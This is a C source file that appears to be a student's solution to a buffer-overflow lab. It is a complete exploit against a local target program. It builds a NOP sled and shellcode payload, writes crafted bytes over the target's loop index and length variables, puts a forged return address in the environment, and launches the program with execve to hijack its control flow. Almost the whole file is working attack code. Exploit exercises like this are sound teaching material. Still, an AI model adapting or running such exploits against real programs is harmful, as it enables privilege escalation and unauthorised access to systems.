#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *args[3];
	char *env[3];

	char attack_string[284]; // with \0 termindator
	memset(attack_string, '\x90', 284);
	//int target_addr;
	//int shell_size = strlen(shellcode);

	// fill with NOP
	//for (i = 0; i < 264; i++){
		//attack_string[i] = 0x90; // NOP
	//}

	// Copy shellcode
	//int offset = 264 - strlen(shellcode);
	//for (i = 0; i < shell_size; i++){
		//attack_string[offset + i] = shellcode[i];
	//}
	strcpy(&attack_string[264 - strlen(shellcode)], shellcode);

	// overwrite new i=267 and len=283
	strcpy(&attack_string[264], "\x0b\x01\x90\x90\x1b\x01");
	//attack_string[LOCAL_SIZE] = 0xb;
	//attack_string[LOCAL_SIZE + 1] = 0x1;
	//attack_string[LOCAL_SIZE + 2] = 0x1;
	//attack_string[LOCAL_SIZE + 3] = 0x1;
	//attack_string[LOCAL_SIZE + 4] = 0x1b;
	//attack_string[LOCAL_SIZE + 5] = 0x1;

	// Terminate attack_string
	//attack_string[BUFF_SIZE] = '\0';
	//char buf_addr[4];
	
	
	args[0] = TARGET;
	args[1] = attack_string;
	args[2] = NULL;

	//target_addr = STACK_ADDR - 280;
	
	//addr[0] = (char)(target_addr & 0xff);
	//addr[1] = (char)((target_addr >> 8) & 0xff);
	//addr[2] = (char)((target_addr >> 16) & 0xff);
	//addr[3] = (char)((target_addr >> 24) & 0xff);

	env[0] = "";
	env[1] = "1234567"; // garbage place holder
	env[2] = "\x40\xfd\x21\x20"; // new return address
	//env[3] = 0;
	//env[4] = 0;
	//env[5] = 0;
	//env[6] = NULL;	

	if ( execve (TARGET, args, env) < 0 )
		fprintf(stderr, "execve failed.\n");

	return (0);	
}
